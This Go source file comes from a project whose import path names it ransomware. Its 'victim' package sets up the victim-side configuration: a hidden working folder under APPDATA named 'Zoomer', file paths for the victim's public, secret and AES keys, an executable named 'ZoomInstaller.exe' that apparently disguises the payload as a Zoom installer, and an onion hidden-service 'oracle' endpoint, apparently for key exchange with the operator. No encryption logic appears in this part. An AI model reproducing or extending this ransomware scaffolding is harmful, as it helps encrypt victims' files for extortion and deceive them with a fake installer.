package victim

import (
    "os"

    "github.com/sug0/sr-ransomware/go/errors"
)

const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"

var (
    workDir = os.Getenv("APPDATA") + `\Zoomer`

    victimPublicKey = workDir + `\a.flu`
    victimSecretKey = workDir + `\b.flu`
    victimAESKey    = workDir + `\c.flu`

    zoomInstaller = workDir + `\ZoomInstaller.exe`
)

const (
    hiddenServiceBase   = "http://example.onion"
    hiddenServiceOracle = hiddenServiceBase + "/oracle"
)

var (
    errNotFullWrite = errors.New(pkg, "failed to write all data")
)
